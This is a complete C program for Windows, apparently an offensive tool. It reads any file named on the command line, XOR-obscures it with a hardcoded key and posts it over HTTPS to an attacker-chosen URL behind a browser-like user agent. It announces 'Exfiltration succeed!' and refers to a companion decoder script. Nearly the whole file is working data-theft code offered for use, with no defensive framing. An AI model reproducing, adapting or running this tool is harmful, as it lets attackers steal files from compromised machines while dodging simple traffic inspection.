#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

void xor_buffer(char* data, DWORD len, const char* key, DWORD keylen) {
    for (DWORD i = 0; i < len; i++) {
        data[i] ^= key[i % keylen];
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s https://url/endpoint <file to exfiltrate>\n", argv[0]);
        printf("*----- Use remounter.py to convert it back -----*");
        return 1;
    }

    const char* url_arg = argv[1];
    const char* input_path = argv[2];
    const char* key = "secreta123";

    HANDLE hFile = CreateFileA(input_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Erro ao abrir %s\n", input_path);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    char* buffer = (char*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    xor_buffer(buffer, fileSize, key, strlen(key));

    URL_COMPONENTSA uc = { 0 };
    uc.dwStructSize = sizeof(uc);

    char host[256] = { 0 };
    char path[512] = { 0 };

    uc.lpszHostName = host;
    uc.dwHostNameLength = sizeof(host);
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = sizeof(path);

    if (!InternetCrackUrlA(url_arg, 0, 0, &uc)) {
        printf("[-] Failed for URL parsing\n");
        free(buffer);
        return 1;
    }

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] InternetOpen failed\n");
        free(buffer);
        return 1;
    }

    HINTERNET hConnect = InternetConnectA(hInternet, host, uc.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[-] InternetConnect failed\n");
        InternetCloseHandle(hInternet);
        free(buffer);
        return 1;
    }

    const char* headers = "Content-Type: application/octet-stream\r\n";
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("[-] HttpOpenRequest failed\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(buffer);
        return 1;
    }

    if (!HttpSendRequestA(hRequest, headers, -1, buffer, fileSize)) {
        printf("[-] HttpSendRequest falhou (%lu)\n", GetLastError());
    }
    else {
        printf("[+] Exfiltration succeed!\n");
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(buffer);

    return 0;
}
